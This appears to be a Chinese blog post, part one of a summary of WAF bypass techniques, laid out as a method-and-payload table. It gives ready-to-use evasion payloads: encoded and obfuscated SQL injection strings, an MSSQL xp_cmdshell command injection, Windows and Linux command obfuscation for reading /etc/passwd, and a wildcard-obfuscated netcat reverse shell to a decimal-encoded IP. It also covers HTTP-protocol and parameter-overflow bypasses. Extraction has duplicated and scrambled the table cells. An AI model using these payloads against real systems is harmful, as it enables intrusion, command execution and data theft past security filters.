# 原创
：  【WAF绕过】姿势总结（一）

# 【WAF绕过】姿势总结（一）

【WAF绕过】姿势总结（一）
| 方法 | Payload 

Payload
| 编码 | 1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==&gt;可对payload进行二次url编码）  2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc  3、部分十六进制编码：adminuser = 0x61646D696E75736572  SQL编码：unicode、HEX、URL、ascll、base64等  5、XSS编码：HTML、URL、ASCII、JS编码、base64等  

1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==&gt;可对payload进行二次url编码）

3、部分十六进制编码：adminuser = 0x61646D696E75736572

5、XSS编码：HTML、URL、ASCII、JS编码、base64等
| 大小写变换 | select = SELecT 

select = SELecT
| 关键字替换 | And = &amp;&amp;  Or = ||  等于号 = like （或使用’&lt;’ 和 ‘&gt;’ 进行判断）  if(a,b,c) = case when(A) then B else C end  substr(str,1,1) = substr (str) from 1 for 1  limit 1,1 = limit 1 offset 1  Union select 1,2 = union select * from ((select 1)A join (select 2)B;  hex()、bin() = ascii()  sleep() = benchmark()  concat_ws() = group_concat()  mid()、substr() = substring()  @@user = user()  @@datadir = datadir() 

And = &amp;&amp;

等于号 = like （或使用’&lt;’ 和 ‘&gt;’ 进行判断）

substr(str,1,1) = substr (str) from 1 for 1

Union select 1,2 = union select * from ((select 1)A join (select 2)B;

sleep() = benchmark()

mid()、substr() = substring()

@@datadir = datadir()
| 特殊字符替换（空格或注释绕过） | sqlserver中：/**/、/*|%23--%23|*/   mysql中： %0a、%0a/**/、//*!*//、#A%0a 

sqlserver中：/**/、/*|%23--%23|*/ 
| 特殊字符重写绕过 | selselectect 

selselectect
| 多请求拆分绕过  | ?a=[inputa]&amp;b=[inputb]  ===》(参数拼接)  and a=[inputa] and b=[inputb] 

?a=[inputa]&amp;b=[inputb]  ===》(参数拼接)  and a=[inputa] and b=[inputb]
| 参数放Cookie里面进行绕过 | $_REQUEST（获取参数，会获取GET POST COOKIE）===&gt;  若未检测cookie，我们可以放cookie里面 

$_REQUEST（获取参数，会获取GET POST COOKIE）===&gt;  若未检测cookie，我们可以放cookie里面
| 使用白名单绕过 | admin dede install等目录特殊目录在白名单内  URL/xxx.php?id=1 union select …… ===》  1、URL/xxx.php/admin?id=1 union select…… 2、URL/admin/..\xxx.php?id=1 union select…… 

admin dede install等目录特殊目录在白名单内

1、URL/xxx.php/admin?id=1 union select……
| 内联注释绕过 | id=1 and 1=1 ===》  id=1/*!and*/1=1 

id=1 and 1=1 ===》  id=1/*!and*/1=1
| 参数重写绕过 | URL/xx.php?id=1 union select  ===》  URL/xx.php?id=1&amp;id=union&amp;id=select&amp;id=……&amp;id= 

URL/xx.php?id=1 union select  ===》
| 特殊字符拼接 | mssql中，函数里面可以用+来拼接 ?id=1;exec('maste'+'r..xp'+'_cmdshell'+'"net user"') 

mssql中，函数里面可以用+来拼接
| Windows特性 | 利用符号分割字符：whoami ==》 ((((Wh^o^am””i))))   利用变量分割关键字：whoami ==》 set a=who&amp;&amp;b=ami&amp;&amp;call %a%%b%  设置一个变量：set a=123whoami456  ===》 取出变量a的第3位开始共计6个字符：echo %a:~3,6%  ===》执行取出的值：%a:~3,6% 

利用符号分割字符：whoami ==》 ((((Wh^o^am””i)))) 

设置一个变量：set a=123whoami456  ===》 取出变量a的第3位开始共计6个字符：echo %a:~3,6%  ===》执行取出的值：%a:~3,6%
| Linux特性 | 单引号或双引号连接符：whoami = w’h’o’a’m”i”  ?,*通配符：Cat /etc/passwd = cat /?t*/??ss**  [] 通配符，匹配【】中的字符：whoami = /b[12312i]n/w[23sh]oa[2msh]i  变量拼接：Whoami = a=who&amp;&amp;b=ami&amp;&amp;$a$b  目录穿越：cat /../../etc/passwd =cd ..&amp;&amp;cd ..&amp;&amp;cd etc&amp;&amp;cat passwd  Shell反弹（127.0.0.1 → 2130706433）：nc -e /bin/bash 127.0.0.1 1234 =/??n/?c -e /??n/b??h 2130706433 1234 

单引号或双引号连接符：whoami = w’h’o’a’m”i”

[] 通配符，匹配【】中的字符：whoami = /b[12312i]n/w[23sh]oa[2msh]i

目录穿越：cat /../../etc/passwd =cd ..&amp;&amp;cd ..&amp;&amp;cd etc&amp;&amp;cat passwd
| 云waf | ===》找真实IP 

===》找真实IP
| bp插件 | bypass waf 

bypass waf
| http协议绕过  | Content-Type绕过：application/x-www-form-urlencoded è multipart/form-data  请求方式绕过：更换请求方法  多Content-Disposition绕过：包含多个Content-Disposition时，中间件与waf取值不同   keep-alive（Pipeline）绕过：手动设置Connection:keep-alive（未断开），然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf  修改编码方式：Charset=xxx进行绕过  

Content-Type绕过：application/x-www-form-urlencoded è multipart/form-data

多Content-Disposition绕过：包含多个Content-Disposition时，中间件与waf取值不同 

修改编码方式：Charset=xxx进行绕过
| Waf检测限制绕过  | 参数溢出  缓冲区溢出： UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT and 1=1 ===》 and 1=1 and 99…99999 //此处省略N多个9 同网段/ssrf绕过  

参数溢出

UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT

同网段/ssrf绕过

---


---


##  实战中心：

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)<img alt="icon-default.png?t=N5K3" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge<img alt="icon-default.png?t=N5K3" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
